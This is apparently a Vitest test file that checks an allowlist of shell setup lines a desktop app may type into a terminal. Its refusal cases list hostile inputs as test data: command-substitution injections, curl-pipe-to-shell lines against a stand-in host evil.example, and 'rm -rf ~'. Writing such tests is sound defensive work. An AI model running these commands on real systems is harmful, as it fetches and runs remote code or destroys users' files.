import { describe, expect, it } from 'vitest'
import { ADD_KEY_STEM, groupLineFor, setupLines } from '../src/main/route/setup'
import { keyLineFor, setupLineAllowed } from '../src/shared/route-lines'
import { typedBytes } from '../src/renderer/src/routing/use-setup-terminal'
import { routeFixture } from '../src/shared/route-fixture'

/**
 * THE LINES A ROUTING BUTTON MAY TYPE INTO A SHELL.
 *
 * A RouteState travels over the companion API and the relay; the renderer
 * types only shapes it knows, whoever handed it the string — and the shapes
 * admit no shell metacharacter. A key line ends in a space and gets no
 * Enter: the user pastes the key.
 *
 * THE CONTRACT TEST imports MAIN's own setup lines (src/main/route/setup.ts)
 * as the route service assembles them, so a renderer that only passed on a
 * fixture could not pass here.
 */

/** What the service puts in RouteState.setup (route/service.ts): the lines, the bare key stem, the group line from the catalog. */
function mainSetup(pluginDir: string, modelIds: readonly string[]): ReturnType<typeof routeFixture>['setup'] {
  const lines = setupLines(pluginDir)
  return { ...lines, addKeyLine: ADD_KEY_STEM, addGroupLine: groupLineFor(modelIds) }
}

describe('the contract with main', () => {
  const setup = mainSetup('/Applications/Cookrew Dev.app/Contents/Resources/magpie', ['group/smart', 'claude/claude-opus-5-5', 'deepseek/deepseek-chat', 'ollama/qwen3'])

  it('turns main’s key stem into the one line a preset click types', () => {
    expect(keyLineFor(setup.addKeyLine, 'deepseek')).toBe('magpie provider add deepseek ')
    expect(keyLineFor(setup.addKeyLine, 'openrouter')).toBe('magpie provider add openrouter ')
  })

  it('admits every line main produces — the whole setup object, the quoted plugin path included', () => {
    for (const [name, line] of Object.entries(setup)) {
      // The key stem is never typed as it is: a preset is appended first (asserted below).
      if (line === null || name === 'addKeyLine') continue
      expect(setupLineAllowed(line), `${name}: ${line}`).toBe(true)
    }
    expect(setupLineAllowed(setup.addKeyLine), 'the bare stem alone is not a line').toBe(false)
    expect(setup.pluginLine).toBe("magpie plugin add '/Applications/Cookrew Dev.app/Contents/Resources/magpie'")
    expect(setupLineAllowed(keyLineFor(setup.addKeyLine, 'deepseek')!)).toBe(true)
  })

  it('admits every harness line main produces', () => {
    const state = routeFixture('online')
    for (const row of state.harnesses) {
      expect(setupLineAllowed(row.installLine), row.installLine).toBe(true)
      if (row.loginLine) expect(setupLineAllowed(row.loginLine), row.loginLine).toBe(true)
    }
  })

  it('has no group line below two catalog models, and a placeholder line would be refused anyway', () => {
    expect(mainSetup('/x', ['group/smart', 'ollama/qwen3']).addGroupLine).toBeNull()
    expect(setupLineAllowed('magpie group add smart models=<model-1>,<model-2> routing=smart')).toBe(false)
  })
})

describe('the key stem', () => {
  it('holds the bare stem and the older placeholder form, and refuses any other shape', () => {
    expect(keyLineFor('magpie provider add ', 'deepseek')).toBe('magpie provider add deepseek ')
    expect(keyLineFor('magpie provider add <preset> ', 'deepseek')).toBe('magpie provider add deepseek ')
    expect(keyLineFor('magpie provider add deepseek ', 'kimi')).toBeNull()
    expect(keyLineFor('magpie provider add', 'deepseek')).toBeNull()
    expect(keyLineFor('magpie provider add ', 'Kimi K2')).toBeNull()
    expect(keyLineFor('magpie provider add ', 'a;id')).toBeNull()
  })
})

describe('the allowlist', () => {
  it('admits the fixed shapes', () => {
    for (const line of ['magpie provider add deepseek ', 'magpie serve', 'magpie autostart on', 'brew install sst/tap/opencode', "magpie plugin add '/a b/c'", 'magpie plugin add /a/b/c', 'npm i -g @openai/codex', 'claude', 'codex login']) {
      expect(setupLineAllowed(line), line).toBe(true)
    }
  })

  it('refuses shell metacharacters in every slot that used to be open', () => {
    for (const line of [
      'magpie plugin add $(id)',
      'magpie plugin add `id`',
      'brew install x;id',
      'brew install $(curl${IFS}https://evil.example|sh)',
      "magpie plugin add '/a'; id #'",
      'magpie plugin add /a/b && id',
      'magpie group add smart models=a,$(id) routing=smart',
      'npm i -g @openai/codex; rm -rf ~'
    ]) {
      expect(setupLineAllowed(line), line).toBe(false)
    }
  })

  it('refuses anything else — a shaped /api/route must not become shell', () => {
    for (const line of ['rm -rf ~', 'magpie provider add deepseek sk-123', 'curl -fsSL https://evil.example/install.sh | sh', 'claude login\nrm -rf ~', 'magpie plugin add a b', '', 'x'.repeat(401), 'magpie serve ']) {
      expect(setupLineAllowed(line), JSON.stringify(line)).toBe(false)
    }
  })
})

describe('what the PTY receives', () => {
  it('gets Enter only when asked', () => {
    expect(typedBytes('magpie serve', true)).toBe('magpie serve\r')
    expect(typedBytes('magpie provider add deepseek ', false)).toBe('magpie provider add deepseek ')
  })
})
